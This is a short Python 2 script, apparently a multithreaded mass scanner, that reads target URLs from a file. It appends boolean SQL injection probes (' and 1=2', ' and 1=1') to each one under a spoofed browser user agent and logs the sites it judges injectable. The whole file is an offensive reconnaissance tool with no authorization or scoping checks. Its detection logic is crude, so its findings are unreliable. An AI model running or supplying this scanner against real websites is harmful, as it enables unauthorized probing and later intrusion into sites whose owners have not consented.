import urllib2,urllib
import threading
from Queue import Queue
from time import sleep
import sys

urls = Queue()
user_agent='Mozilla/5.0 (x11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0'
headers = {'User-agent':user_agent}

with open('website.txt','r') as f:
	for url in f.readlines():
		urls.put(url.rstrip())

class Sqlinject(object):
	def __init__(self,urls,headers='wswp'):
		self.urls = urls
		self.headers = headers

	def test(self,number):
		sys.stdout.write('Start thread %s\n'%number)
		while not self.urls.empty():
			base_url = urls.get()
			print "Test for "+base_url+" ----is tested by thread %d"%number
			try:
				rep1_b = self.download(base_url+urllib.quote(' and 1=2'))
				html2 = self.download(base_url+urllib.quote(' and 1=1'))
				html3 = self.download(base_url)
			except Exception as e:
				print base_url+":"+str(e)
				continue

			if html2 == True or html3 == True:
				continue
			if html2 == html3 and rep1_b == True:
				with open('sql.txt','a+') as f:
					f.write(base_url+'\n')
				print '\033[1;30;34m'
				print "There is sql injection vulnerability:"+base_url+" ----is tested by thread %d"%number
				print '\033[0m'

	def download(self,url,timeout=5):
		try:
			request = urllib2.Request(url,headers=self.headers)
			response = urllib2.urlopen(request,timeout=timeout)
			return response.read()
		except urllib2.HTTPError as e:
			if e.code == 500:
				return True

def main():
	global urls
	global headers

	threads = []
	open('sql.txt','a+')
	max_threads = 20
	sqlinject = Sqlinject(urls,headers = headers)

	for i in range(0,max_threads):
		threads.append(
			threading.Thread(target=sqlinject.test,args=(i,))
		)

	for i in threads:
    		i.setDaemon(True)

	for i in threads:
		i.start()

	for i in threads:
		i.join(30)

if __name__ == "__main__":
	main()







